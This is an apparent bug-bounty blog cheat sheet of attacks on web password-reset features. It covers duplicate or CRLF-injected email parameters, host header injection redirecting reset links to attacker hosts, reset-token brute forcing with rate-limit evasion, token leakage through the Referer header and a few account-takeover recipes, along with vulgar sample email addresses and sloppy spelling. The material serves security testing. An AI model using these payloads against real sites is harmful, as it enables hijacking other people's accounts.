---
title: Forgot Password Cheat Sheet
description: webvun,hacking
author: samidunimsara
date: 2020-08-08 11:33:00 +0800
categories: [hackingweb, web]
tags: [web]

---

# Password Reset Functionalities

- 1.) **Include your mail as a second parameter (you 
      might receive the reset link):**
    
    ```bash
    POST /reset
    email=victim@tld.xyz&email=hacker@tld.xyz
    ```
    
- 2) Brute force reset token if it is numeric. You can use IP Rotator on Burpsuite
    
    ```bash
    to bypass rate limit in case it's IP based :
    
    POST /reset
    email=victim@tld.xyz&code=$BRUTE$
    ```
    
- 3) Try to use your reset token on target's account
    
    ```bash
    POST /reset
    email=victim@tld.xyz&code=$YOUR-TOKEN$
    ```
    
- 4) Host header injection; change website.com to hacker.com (victim might receive the reset link with)
    
    ```bash
    POST /resetHost: hacker.com[ … … . ].
    ```
    
- Try to figure out how the tokens are generated. Exemples can be
    
    ```bash
    -Generated based on TimeStamp-
    -Generated based on the ID of the user
    -Generated based on the email of the user
    ```
    
- ) Try
    
    ```bash
    .user@email.com&bcc:attacker@email.com 
    
    .user@email.com,attacker@email.com.
    
    .victimspussy@ymail.com:attackersdick@ymail.com
    
    .{"email":["victim@gmail.com","attacker@gmail.com"]}
    
    .email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
    
    {"email":["victim12345@gmail.com","attacker12345@gmail.com"    ]}
    
    POST /reset
    email=victim@mail.com%0a%0dcc:hacker@mail.com
    
    no gmail.com No domain:email=victim   
    
    {"email": ["victim@xyz.tld","hacker@xyz.tld"]}
    
    Carbon copy:
    email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld
    
    ```
    
- When requesting a new password reset link try to inject some html tags in the host header,
    
    ```bash
    Example:-Host: http://redacted.com?><a href=http://evil.com
    ```
    
- Also look into response body, sometimes passwd reset token leaks there.
- In JSON array
    
    ```bash
    {"email":["victim@mail.tld","atracker@mail.tld"]}
    ```
    
- reset password so that you get a reset OTP in your email
    - Don't use it.
    - Sign into your account and change your email address.
    - Once it's changed, try using the old OTP.
    - if the link still works then users can't rescue their account if their email is compromised.
- x-forwarded-host: {{7*7}} and X-Forwarded-For: yu will receive 49 in yur email if the application was infected ;)
- ATO
    
    
    ```bash
    1.Go to reset password
    2.Enter your Email and intercept request
    3.change Host+Referrer+originWith your server eg:burp collob..*
    4.Victim will receive  yourserver/token=$
    5.When He Click on Link you will got token
    
    ```
    
- Another ATO
    
    ```bash
    1.Generated reset password link,
    2.Gave password, and intercepted the request.
    3.Change my email with victim email and victim pass got changed
    ```
    
- Leakage of the password reset token in the referer header:
    
    ```bash
     1.In the password reset page after:
     2.Click on any social media handle or any 3rd party sites link & intercept the request
     3.If the reset token is leaked in refer header, Just report it! H1 report 751581 ``
    ```
    
    [https://github.com/imran-parray/Web-Sec-CheatSheet/blob/master/password_reset.md](https://github.com/imran-parray/Web-Sec-CheatSheet/blob/master/password_reset.md)
    
- Password Reset Token Leakage
    
    ```bash
    
    Steps:    
    01.Send a password reset request 
    02.copy your reset page link from mail  and paste in another tab and make burp intercept on.
    03.after clinck link open facebook twiterr .random web site  
    https://www.youtube.com/watch?v=X3YxJFiTa6c&t=2s
    04. search reset link in puep historry
    05.if you find similiar token that is in reset link with other domain its vunarable
    ```
    
    - It was just simple one by response manipulation. Change the body from "false" to "true
- Host Header 💉
    
    ```bash
    1.Go to password reset funtion.
    2.Enter email and intercept the request and change like this    Host:http://target.com    Host:burp collbr    Host: http://attacker.com/www.target.com    Host: http://attacker.com&www.target.com
    4.if you found http://attacker.com in reset link.. Report it
    ```
    
- Password reset link not expiring
    - After reset password using reset link try another time using same link
- Dos via enter long password
    
    ```bash
    1.enter long password 1000 caracter if response 500 its dos
    ```
  
